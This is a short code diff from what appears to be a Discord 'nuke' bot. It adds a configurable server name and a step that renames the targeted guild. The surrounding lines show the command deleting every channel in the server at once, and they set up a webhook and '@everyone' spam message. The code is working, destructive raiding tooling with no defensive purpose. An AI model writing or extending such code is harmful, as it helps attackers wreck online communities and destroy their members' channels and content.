@@ -34,9 +34,16 @@ async def nuke(ctx):
     channel_name = config.get("CHANNEL_NAME", "lol")
     webhook_name = config.get("WEBHOOK_NAME", "lol")
     message = config.get("MESSAGE", "@everyone")
+    server_name = config.get("SERVER_NAME", "fun-server")
     
 
     guild = ctx.guild
+
+    try:
+        await guild.edit(name=server_name)
+        print(f"[*] Server name changed to '{server_name}'")
+    except Exception as e:
+        print(f"[*] Failed to change server name: {e}")
 
     delete_tasks = [channel.delete() for channel in guild.channels]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
